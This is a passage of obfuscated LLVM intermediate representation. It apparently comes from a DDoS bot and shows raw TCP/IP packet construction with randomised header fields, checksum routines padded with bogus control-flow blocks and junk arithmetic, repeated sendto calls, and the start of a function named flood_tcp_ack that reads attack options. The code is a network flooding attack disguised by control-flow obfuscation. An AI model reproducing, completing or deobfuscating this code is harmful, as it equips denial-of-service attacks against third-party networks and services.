  %589 = load %struct.tcphdr*, %struct.tcphdr** %495, align 8
  %590 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %589, i32 0, i32 0
  %591 = bitcast %union.anon* %590 to %struct.anon.0*
  %592 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %591, i32 0, i32 4
  %593 = load i16, i16* %592, align 4
  %594 = and i16 %593, -513
  %_85 = sub i16 0, %594
  %gen86 = add i16 %_85, 512
  %595 = or i16 %594, 512
  store i16 %595, i16* %592, align 4
  %596 = load %struct.tcphdr*, %struct.tcphdr** %495, align 8
  %597 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %596, i32 0, i32 0
  %598 = bitcast %union.anon* %597 to %struct.anon.0*
  %599 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %598, i32 0, i32 3
  store i32 0, i32* %599, align 4
  %600 = call i32 @rand_new()
  %_87 = sub i32 %600, 65535
  %gen88 = mul i32 %_87, 65535
  %_89 = sub i32 %600, 65535
  %gen90 = mul i32 %_89, 65535
  %_91 = shl i32 %600, 65535
  %_92 = sub i32 0, %600
  %gen93 = add i32 %_92, 65535
  %_94 = sub i32 0, %600
  %gen95 = add i32 %_94, 65535
  %601 = and i32 %600, 65535
  %602 = trunc i32 %601 to i16
  %603 = load %struct.iphdr*, %struct.iphdr** %494, align 8
  %604 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %603, i32 0, i32 3
  store i16 %602, i16* %604, align 4
  %605 = load i32, i32* %485, align 4
  %606 = load %struct.iphdr*, %struct.iphdr** %494, align 8
  %607 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %606, i32 0, i32 8
  store i32 %605, i32* %607, align 4
  %608 = load i32, i32* %484, align 4
  %609 = load %struct.iphdr*, %struct.iphdr** %494, align 8
  %610 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %609, i32 0, i32 9
  store i32 %608, i32* %610, align 4
  %611 = load %struct.iphdr*, %struct.iphdr** %494, align 8
  %612 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %611, i32 0, i32 7
  store i16 0, i16* %612, align 2
  %613 = load %struct.iphdr*, %struct.iphdr** %494, align 8
  %614 = bitcast %struct.iphdr* %613 to i16*
  %615 = call zeroext i16 @checksum_generic(i16* %614, i32 20)
  %616 = load %struct.iphdr*, %struct.iphdr** %494, align 8
  %617 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %616, i32 0, i32 7
  store i16 %615, i16* %617, align 2
  %618 = call i32 @rand_new()
  %_96 = sub i32 %618, 65535
  %gen97 = mul i32 %_96, 65535
  %619 = and i32 %618, 65535
  %620 = load %struct.tcphdr*, %struct.tcphdr** %495, align 8
  %621 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %620, i32 0, i32 0
  %622 = bitcast %union.anon* %621 to %struct.anon.0*
  %623 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %622, i32 0, i32 2
  store i32 %619, i32* %623, align 4
  %624 = load %struct.tcphdr*, %struct.tcphdr** %495, align 8
  %625 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %624, i32 0, i32 0
  %626 = bitcast %union.anon* %625 to %struct.anon.0*
  %627 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %626, i32 0, i32 6
  store i16 0, i16* %627, align 4
  %628 = load %struct.iphdr*, %struct.iphdr** %494, align 8
  %629 = load %struct.tcphdr*, %struct.tcphdr** %495, align 8
  %630 = bitcast %struct.tcphdr* %629 to i8*
  %631 = call zeroext i16 @htons(i16 zeroext 20) #9
  %632 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %628, i8* %630, i16 zeroext %631, i32 20)
  %633 = load %struct.tcphdr*, %struct.tcphdr** %495, align 8
  %634 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %633, i32 0, i32 0
  %635 = bitcast %union.anon* %634 to %struct.anon.0*
  %636 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %635, i32 0, i32 6
  store i16 %632, i16* %636, align 4
  %637 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %496, i32 0, i32 0
  store i16 2, i16* %637, align 4
  %638 = load %struct.tcphdr*, %struct.tcphdr** %495, align 8
  %639 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %638, i32 0, i32 0
  %640 = bitcast %union.anon* %639 to %struct.anon.0*
  %641 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %640, i32 0, i32 1
  %642 = load i16, i16* %641, align 2
  %643 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %496, i32 0, i32 1
  store i16 %642, i16* %643, align 2
  %644 = load %struct.iphdr*, %struct.iphdr** %494, align 8
  %645 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %644, i32 0, i32 9
  %646 = load i32, i32* %645, align 4
  %647 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %496, i32 0, i32 2
  %648 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %647, i32 0, i32 0
  store i32 %646, i32* %648, align 4
  %649 = getelementptr inbounds [40 x i8], [40 x i8]* %492, i32 0, i32 0
  %650 = getelementptr inbounds [40 x i8], [40 x i8]* %491, i32 0, i32 0
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %649, i8* %650, i64 40, i32 16, i1 false)
  %651 = load %struct.tcphdr*, %struct.tcphdr** %495, align 8
  %652 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %651, i32 0, i32 0
  %653 = bitcast %union.anon* %652 to %struct.anon.0*
  %654 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %653, i32 0, i32 3
  %655 = load i32, i32* %654, align 4
  %656 = call i32 @ntohl(i32 %655) #9
  %657 = load %struct.tcphdr*, %struct.tcphdr** %495, align 8
  %658 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %657, i32 0, i32 0
  %659 = bitcast %union.anon* %658 to %struct.anon.0*
  %660 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %659, i32 0, i32 2
  %661 = load i32, i32* %660, align 4
  %662 = call i32 @ntohl(i32 %661) #9
  %663 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str, i32 0, i32 0), i32 %656, i32 %662)
  %664 = load i32, i32* %483, align 4
  %665 = getelementptr inbounds [40 x i8], [40 x i8]* %491, i32 0, i32 0
  %666 = bitcast %union.__CONST_SOCKADDR_ARG* %498 to %struct.sockaddr**
  %667 = bitcast %struct.sockaddr_in* %496 to %struct.sockaddr*
  store %struct.sockaddr* %667, %struct.sockaddr** %666, align 8
  %668 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %498, i32 0, i32 0
  %669 = load %struct.sockaddr*, %struct.sockaddr** %668, align 8
  %670 = call i64 @sendto(i32 %664, i8* %665, i64 40, i32 16384, %struct.sockaddr* %669, i32 16)
  %671 = trunc i64 %670 to i32
  store i32 %671, i32* %497, align 4
  %672 = load i32, i32* %497, align 4
  %673 = icmp eq i32 %672, -1
  br label %originalBB

originalBB98alteredBB:                            ; preds = %originalBB98, %231
  %674 = load i32, i32* %32, align 4
  %675 = icmp slt i32 %674, 10000
  br label %originalBB98

originalBB102alteredBB:                           ; preds = %originalBB102, %260
  br label %originalBB102

originalBB106alteredBB:                           ; preds = %originalBB106, %277
  %676 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %677 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %676, i32 0, i32 8
  %678 = load i32, i32* %677, align 4
  %679 = load i32, i32* %17, align 4
  %680 = icmp eq i32 %678, %679
  br label %originalBB106

originalBB110alteredBB:                           ; preds = %originalBB110, %459
  %681 = load i32, i32* %30, align 4
  %682 = icmp eq i32 %681, -1
  %683 = select i1 %682, i32 0, i32 1
  store i32 %683, i32* %14, align 4
  br label %originalBB110
}

declare zeroext i16 @ip_header_checksum(i16*, i32) #6

declare zeroext i16 @tcp_udp_header_checksum(%struct.iphdr*, i8*, i16 zeroext, i32) #6

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #6

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #4

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_generic(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %16, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp ugt i32 %7, 1
  br i1 %8, label %9, label %19

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, %13
  store i64 %15, i64* %5, align 8
  br label %16

; <label>:16:                                     ; preds = %9
  %17 = load i32, i32* %4, align 4
  %18 = sub i32 %17, 2
  store i32 %18, i32* %4, align 4
  br label %6

; <label>:19:                                     ; preds = %6
  %20 = load i32, i32* @x.23
  %21 = load i32, i32* @y.24
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %19
  %28 = load i32, i32* %4, align 4
  %29 = icmp eq i32 %28, 1
  %30 = load i32, i32* @x.23
  %31 = load i32, i32* @y.24
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %29, label %38, label %45

; <label>:38:                                     ; preds = %originalBBpart2
  %39 = load i16*, i16** %3, align 8
  %40 = load i16, i16* %39, align 2
  %41 = trunc i16 %40 to i8
  %42 = sext i8 %41 to i64
  %43 = load i64, i64* %5, align 8
  %44 = add i64 %43, %42
  store i64 %44, i64* %5, align 8
  br label %45

; <label>:45:                                     ; preds = %38, %originalBBpart2
  %46 = load i64, i64* %5, align 8
  %47 = lshr i64 %46, 16
  %48 = load i64, i64* %5, align 8
  %49 = and i64 %48, 65535
  %50 = add i64 %47, %49
  store i64 %50, i64* %5, align 8
  %51 = load i64, i64* %5, align 8
  %52 = lshr i64 %51, 16
  %53 = load i64, i64* %5, align 8
  %54 = add i64 %53, %52
  store i64 %54, i64* %5, align 8
  %55 = load i64, i64* %5, align 8
  %56 = xor i64 %55, -1
  %57 = trunc i64 %56 to i16
  ret i16 %57

originalBBalteredBB:                              ; preds = %originalBB, %19
  %58 = load i32, i32* %4, align 4
  %59 = icmp eq i32 %58, 1
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #0 {
  %5 = alloca %struct.iphdr*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i16, align 2
  %8 = alloca i32, align 4
  %9 = alloca i16*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %5, align 8
  store i8* %1, i8** %6, align 8
  store i16 %2, i16* %7, align 2
  store i32 %3, i32* %8, align 4
  %14 = load i8*, i8** %6, align 8
  %15 = bitcast i8* %14 to i16*
  store i16* %15, i16** %9, align 8
  %16 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %16, i32 0, i32 8
  %18 = load i32, i32* %17, align 4
  store i32 %18, i32* %10, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %20 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %19, i32 0, i32 9
  %21 = load i32, i32* %20, align 4
  store i32 %21, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %22 = load i32, i32* %8, align 4
  store i32 %22, i32* %13, align 4
  br label %23

; <label>:23:                                     ; preds = %26, %4
  %24 = load i32, i32* %8, align 4
  %25 = icmp sgt i32 %24, 1
  br i1 %25, label %26, label %36

; <label>:26:                                     ; preds = %23
  %27 = load i16*, i16** %9, align 8
  %28 = load i16, i16* %27, align 2
  %29 = zext i16 %28 to i32
  %30 = load i32, i32* %12, align 4
  %31 = add i32 %30, %29
  store i32 %31, i32* %12, align 4
  %32 = load i16*, i16** %9, align 8
  %33 = getelementptr inbounds i16, i16* %32, i32 1
  store i16* %33, i16** %9, align 8
  %34 = load i32, i32* %8, align 4
  %35 = sub nsw i32 %34, 2
  store i32 %35, i32* %8, align 4
  br label %23

; <label>:36:                                     ; preds = %23
  %37 = load i32, i32* @x.25
  %38 = load i32, i32* @y.26
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %36
  %45 = load i32, i32* %8, align 4
  %46 = icmp eq i32 %45, 1
  %47 = load i32, i32* @x.25
  %48 = load i32, i32* @y.26
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %46, label %55, label %62

; <label>:55:                                     ; preds = %originalBBpart2
  %56 = load i16*, i16** %9, align 8
  %57 = bitcast i16* %56 to i8*
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i32
  %60 = load i32, i32* %12, align 4
  %61 = add i32 %60, %59
  store i32 %61, i32* %12, align 4
  br label %62

; <label>:62:                                     ; preds = %55, %originalBBpart2
  %63 = load i32, i32* @x.25
  %64 = load i32, i32* @y.26
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %62
  %71 = load i32, i32* %10, align 4
  %72 = lshr i32 %71, 16
  %73 = and i32 %72, 65535
  %74 = load i32, i32* %12, align 4
  %75 = add i32 %74, %73
  store i32 %75, i32* %12, align 4
  %76 = load i32, i32* %10, align 4
  %77 = and i32 %76, 65535
  %78 = load i32, i32* %12, align 4
  %79 = add i32 %78, %77
  store i32 %79, i32* %12, align 4
  %80 = load i32, i32* %11, align 4
  %81 = lshr i32 %80, 16
  %82 = and i32 %81, 65535
  %83 = load i32, i32* %12, align 4
  %84 = add i32 %83, %82
  store i32 %84, i32* %12, align 4
  %85 = load i32, i32* %11, align 4
  %86 = and i32 %85, 65535
  %87 = load i32, i32* %12, align 4
  %88 = add i32 %87, %86
  store i32 %88, i32* %12, align 4
  %89 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %90 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %89, i32 0, i32 6
  %91 = load i8, i8* %90, align 1
  %92 = zext i8 %91 to i16
  %93 = call zeroext i16 @htons(i16 zeroext %92) #9
  %94 = zext i16 %93 to i32
  %95 = load i32, i32* %12, align 4
  %96 = add i32 %95, %94
  store i32 %96, i32* %12, align 4
  %97 = load i16, i16* %7, align 2
  %98 = zext i16 %97 to i32
  %99 = load i32, i32* %12, align 4
  %100 = add i32 %99, %98
  store i32 %100, i32* %12, align 4
  %101 = load i32, i32* @x.25
  %102 = load i32, i32* @y.26
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBBpart271, label %originalBB1alteredBB

originalBBpart271:                                ; preds = %originalBB1
  br label %109

; <label>:109:                                    ; preds = %originalBBpart2101, %originalBBpart271
  %110 = load i32, i32* %12, align 4
  %111 = lshr i32 %110, 16
  %112 = icmp ne i32 %111, 0
  br i1 %112, label %113, label %135

; <label>:113:                                    ; preds = %109
  %114 = load i32, i32* @x.25
  %115 = load i32, i32* @y.26
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBB73, label %originalBB73alteredBB

originalBB73:                                     ; preds = %originalBB73alteredBB, %113
  %122 = load i32, i32* %12, align 4
  %123 = and i32 %122, 65535
  %124 = load i32, i32* %12, align 4
  %125 = lshr i32 %124, 16
  %126 = add i32 %123, %125
  store i32 %126, i32* %12, align 4
  %127 = load i32, i32* @x.25
  %128 = load i32, i32* @y.26
  %129 = sub i32 %127, 1
  %130 = mul i32 %127, %129
  %131 = urem i32 %130, 2
  %132 = icmp eq i32 %131, 0
  %133 = icmp slt i32 %128, 10
  %134 = or i1 %132, %133
  br i1 %134, label %originalBBpart2101, label %originalBB73alteredBB

originalBBpart2101:                               ; preds = %originalBB73
  br label %109

; <label>:135:                                    ; preds = %109
  %136 = load i32, i32* @x.25
  %137 = load i32, i32* @y.26
  %138 = sub i32 %136, 1
  %139 = mul i32 %136, %138
  %140 = urem i32 %139, 2
  %141 = icmp eq i32 %140, 0
  %142 = icmp slt i32 %137, 10
  %143 = or i1 %141, %142
  br i1 %143, label %originalBB103, label %originalBB103alteredBB

originalBB103:                                    ; preds = %originalBB103alteredBB, %135
  %144 = load i32, i32* %12, align 4
  %145 = xor i32 %144, -1
  %146 = trunc i32 %145 to i16
  %147 = load i32, i32* @x.25
  %148 = load i32, i32* @y.26
  %149 = sub i32 %147, 1
  %150 = mul i32 %147, %149
  %151 = urem i32 %150, 2
  %152 = icmp eq i32 %151, 0
  %153 = icmp slt i32 %148, 10
  %154 = or i1 %152, %153
  br i1 %154, label %originalBBpart2111, label %originalBB103alteredBB

originalBBpart2111:                               ; preds = %originalBB103
  ret i16 %146

originalBBalteredBB:                              ; preds = %originalBB, %36
  %155 = load i32, i32* %8, align 4
  %156 = icmp eq i32 %155, 1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %62
  %157 = load i32, i32* %10, align 4
  %_ = shl i32 %157, 16
  %_2 = sub i32 0, %157
  %gen = add i32 %_2, 16
  %_3 = sub i32 %157, 16
  %gen4 = mul i32 %_3, 16
  %_5 = sub i32 %157, 16
  %gen6 = mul i32 %_5, 16
  %158 = lshr i32 %157, 16
  %_7 = sub i32 0, %158
  %gen8 = add i32 %_7, 65535
  %159 = and i32 %158, 65535
  %160 = load i32, i32* %12, align 4
  %_9 = sub i32 0, %160
  %gen10 = add i32 %_9, %159
  %161 = add i32 %160, %159
  store i32 %161, i32* %12, align 4
  %162 = load i32, i32* %10, align 4
  %_11 = sub i32 0, %162
  %gen12 = add i32 %_11, 65535
  %_13 = shl i32 %162, 65535
  %_14 = sub i32 0, %162
  %gen15 = add i32 %_14, 65535
  %_16 = sub i32 0, %162
  %gen17 = add i32 %_16, 65535
  %163 = and i32 %162, 65535
  %164 = load i32, i32* %12, align 4
  %_18 = shl i32 %164, %163
  %_19 = sub i32 0, %164
  %gen20 = add i32 %_19, %163
  %_21 = sub i32 %164, %163
  %gen22 = mul i32 %_21, %163
  %165 = add i32 %164, %163
  store i32 %165, i32* %12, align 4
  %166 = load i32, i32* %11, align 4
  %_23 = sub i32 0, %166
  %gen24 = add i32 %_23, 16
  %_25 = sub i32 %166, 16
  %gen26 = mul i32 %_25, 16
  %_27 = sub i32 %166, 16
  %gen28 = mul i32 %_27, 16
  %_29 = sub i32 %166, 16
  %gen30 = mul i32 %_29, 16
  %_31 = shl i32 %166, 16
  %167 = lshr i32 %166, 16
  %_32 = shl i32 %167, 65535
  %_33 = sub i32 0, %167
  %gen34 = add i32 %_33, 65535
  %168 = and i32 %167, 65535
  %169 = load i32, i32* %12, align 4
  %_35 = sub i32 0, %169
  %gen36 = add i32 %_35, %168
  %_37 = sub i32 %169, %168
  %gen38 = mul i32 %_37, %168
  %_39 = shl i32 %169, %168
  %170 = add i32 %169, %168
  store i32 %170, i32* %12, align 4
  %171 = load i32, i32* %11, align 4
  %_40 = sub i32 0, %171
  %gen41 = add i32 %_40, 65535
  %_42 = shl i32 %171, 65535
  %_43 = sub i32 %171, 65535
  %gen44 = mul i32 %_43, 65535
  %_45 = sub i32 %171, 65535
  %gen46 = mul i32 %_45, 65535
  %_47 = sub i32 0, %171
  %gen48 = add i32 %_47, 65535
  %172 = and i32 %171, 65535
  %173 = load i32, i32* %12, align 4
  %_49 = shl i32 %173, %172
  %_50 = shl i32 %173, %172
  %_51 = sub i32 %173, %172
  %gen52 = mul i32 %_51, %172
  %_53 = sub i32 %173, %172
  %gen54 = mul i32 %_53, %172
  %_55 = sub i32 0, %173
  %gen56 = add i32 %_55, %172
  %174 = add i32 %173, %172
  store i32 %174, i32* %12, align 4
  %175 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %176 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %175, i32 0, i32 6
  %177 = load i8, i8* %176, align 1
  %178 = zext i8 %177 to i16
  %179 = call zeroext i16 @htons(i16 zeroext %178) #9
  %180 = zext i16 %179 to i32
  %181 = load i32, i32* %12, align 4
  %_57 = shl i32 %181, %180
  %_58 = shl i32 %181, %180
  %_59 = sub i32 %181, %180
  %gen60 = mul i32 %_59, %180
  %_61 = sub i32 0, %181
  %gen62 = add i32 %_61, %180
  %_63 = shl i32 %181, %180
  %_64 = sub i32 %181, %180
  %gen65 = mul i32 %_64, %180
  %_66 = sub i32 0, %181
  %gen67 = add i32 %_66, %180
  %182 = add i32 %181, %180
  store i32 %182, i32* %12, align 4
  %183 = load i16, i16* %7, align 2
  %184 = zext i16 %183 to i32
  %185 = load i32, i32* %12, align 4
  %_68 = sub i32 %185, %184
  %gen69 = mul i32 %_68, %184
  %186 = add i32 %185, %184
  store i32 %186, i32* %12, align 4
  br label %originalBB1

originalBB73alteredBB:                            ; preds = %originalBB73, %113
  %187 = load i32, i32* %12, align 4
  %_74 = sub i32 0, %187
  %gen75 = add i32 %_74, 65535
  %_76 = shl i32 %187, 65535
  %_77 = sub i32 %187, 65535
  %gen78 = mul i32 %_77, 65535
  %_79 = shl i32 %187, 65535
  %_80 = sub i32 %187, 65535
  %gen81 = mul i32 %_80, 65535
  %_82 = shl i32 %187, 65535
  %_83 = shl i32 %187, 65535
  %188 = and i32 %187, 65535
  %189 = load i32, i32* %12, align 4
  %_84 = sub i32 0, %189
  %gen85 = add i32 %_84, 16
  %_86 = shl i32 %189, 16
  %_87 = shl i32 %189, 16
  %_88 = sub i32 %189, 16
  %gen89 = mul i32 %_88, 16
  %_90 = shl i32 %189, 16
  %_91 = sub i32 0, %189
  %gen92 = add i32 %_91, 16
  %190 = lshr i32 %189, 16
  %_93 = sub i32 %188, %190
  %gen94 = mul i32 %_93, %190
  %_95 = sub i32 %188, %190
  %gen96 = mul i32 %_95, %190
  %_97 = shl i32 %188, %190
  %_98 = sub i32 %188, %190
  %gen99 = mul i32 %_98, %190
  %191 = add i32 %188, %190
  store i32 %191, i32* %12, align 4
  br label %originalBB73

originalBB103alteredBB:                           ; preds = %originalBB103, %135
  %192 = load i32, i32* %12, align 4
  %_104 = sub i32 0, %192
  %gen105 = add i32 %_104, -1
  %_106 = sub i32 %192, -1
  %gen107 = mul i32 %_106, -1
  %_108 = sub i32 %192, -1
  %gen109 = mul i32 %_108, -1
  %193 = xor i32 %192, -1
  %194 = trunc i32 %193 to i16
  br label %originalBB103
}

declare i32 @printf(i8*, ...) #6

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) #6

; Function Attrs: noinline nounwind uwtable
define void @flood_tcp_ack(%struct.arguments*) #0 {
  %2 = alloca %struct.arguments*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i16, align 2
  %6 = alloca i16, align 2
  %7 = alloca i8, align 1
  %8 = alloca i16, align 2
  %9 = alloca i8**, align 8
  %10 = alloca i8, align 1
  %11 = alloca i8, align 1
  %12 = alloca i8, align 1
  %13 = alloca i8, align 1
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i32*, align 8
  %23 = alloca i32, align 4
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.tcphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca %struct.sockaddr_in, align 4
  %30 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store %struct.arguments* %0, %struct.arguments** %2, align 8
  store i32 0, i32* %3, align 4
  store i32 0, i32* %4, align 4
  store i16 0, i16* %5, align 2
  store i16 0, i16* %6, align 2
  store i8 0, i8* %7, align 1
  store i16 0, i16* %8, align 2
  store i8 0, i8* %10, align 1
  store i8 0, i8* %11, align 1
  store i8 0, i8* %12, align 1
  store i8 0, i8* %13, align 1
  store i8 0, i8* %14, align 1
  store i8 0, i8* %15, align 1
  store i8 0, i8* %16, align 1
  store i16 0, i16* %17, align 2
  store i32 0, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  store i32 0, i32* %23, align 4
  %31 = load %struct.arguments*, %struct.arguments** %2, align 8
  %32 = getelementptr inbounds %struct.arguments, %struct.arguments* %31, i32 0, i32 1
  %33 = load %struct.option*, %struct.option** %32, align 8
  %34 = load %struct.arguments*, %struct.arguments** %2, align 8
  %35 = getelementptr inbounds %struct.arguments, %struct.arguments* %34, i32 0, i32 2
  %36 = load i8, i8* %35, align 8
  %37 = call zeroext i16 @retrieve_opt_num(%struct.option* %33, i8 zeroext %36, i8 zeroext 2, i16 zeroext 900)
  store i16 %37, i16* %5, align 2
  %38 = load %struct.arguments*, %struct.arguments** %2, align 8
  %39 = getelementptr inbounds %struct.arguments, %struct.arguments* %38, i32 0, i32 1
  %40 = load %struct.option*, %struct.option** %39, align 8
  %41 = load %struct.arguments*, %struct.arguments** %2, align 8
  %42 = getelementptr inbounds %struct.arguments, %struct.arguments* %41, i32 0, i32 2
  %43 = load i8, i8* %42, align 8
  %44 = call zeroext i16 @retrieve_opt_num(%struct.option* %40, i8 zeroext %43, i8 zeroext 1, i16 zeroext -1)
  store i16 %44, i16* %6, align 2
  %45 = load %struct.arguments*, %struct.arguments** %2, align 8
  %46 = getelementptr inbounds %struct.arguments, %struct.arguments* %45, i32 0, i32 1
  %47 = load %struct.option*, %struct.option** %46, align 8
  %48 = load %struct.arguments*, %struct.arguments** %2, align 8
  %49 = getelementptr inbounds %struct.arguments, %struct.arguments* %48, i32 0, i32 2
  %50 = load i8, i8* %49, align 8
  %51 = call zeroext i16 @retrieve_opt_num(%struct.option* %47, i8 zeroext %50, i8 zeroext 7, i16 zeroext 255)
  %52 = trunc i16 %51 to i8
  store i8 %52, i8* %7, align 1
  %53 = load %struct.arguments*, %struct.arguments** %2, align 8
  %54 = getelementptr inbounds %struct.arguments, %struct.arguments* %53, i32 0, i32 1
  %55 = load %struct.option*, %struct.option** %54, align 8
  %56 = load %struct.arguments*, %struct.arguments** %2, align 8
  %57 = getelementptr inbounds %struct.arguments, %struct.arguments* %56, i32 0, i32 2
  %58 = load i8, i8* %57, align 8
  %59 = call zeroext i16 @retrieve_opt_num(%struct.option* %55, i8 zeroext %58, i8 zeroext 8, i16 zeroext -1)
  store i16 %59, i16* %8, align 2
  %60 = load %struct.arguments*, %struct.arguments** %2, align 8
  %61 = getelementptr inbounds %struct.arguments, %struct.arguments* %60, i32 0, i32 1
  %62 = load %struct.option*, %struct.option** %61, align 8
  %63 = load %struct.arguments*, %struct.arguments** %2, align 8
  %64 = getelementptr inbounds %struct.arguments, %struct.arguments* %63, i32 0, i32 2
  %65 = load i8, i8* %64, align 8
  %66 = call zeroext i16 @retrieve_opt_num(%struct.option* %62, i8 zeroext %65, i8 zeroext 9, i16 zeroext 1)
  %67 = trunc i16 %66 to i8
  store i8 %67, i8* %10, align 1
  %68 = load %struct.arguments*, %struct.arguments** %2, align 8
  %69 = getelementptr inbounds %struct.arguments, %struct.arguments* %68, i32 0, i32 1
  %70 = load %struct.option*, %struct.option** %69, align 8
  %71 = load %struct.arguments*, %struct.arguments** %2, align 8
  %72 = getelementptr inbounds %struct.arguments, %struct.arguments* %71, i32 0, i32 2
  %73 = load i8, i8* %72, align 8
  %74 = call zeroext i16 @retrieve_opt_num(%struct.option* %70, i8 zeroext %73, i8 zeroext 10, i16 zeroext 0)
  %75 = trunc i16 %74 to i8
  store i8 %75, i8* %11, align 1
  %76 = load %struct.arguments*, %struct.arguments** %2, align 8
  %77 = getelementptr inbounds %struct.arguments, %struct.arguments* %76, i32 0, i32 1
  %78 = load %struct.option*, %struct.option** %77, align 8
  %79 = load %struct.arguments*, %struct.arguments** %2, align 8
  %80 = getelementptr inbounds %struct.arguments, %struct.arguments* %79, i32 0, i32 2
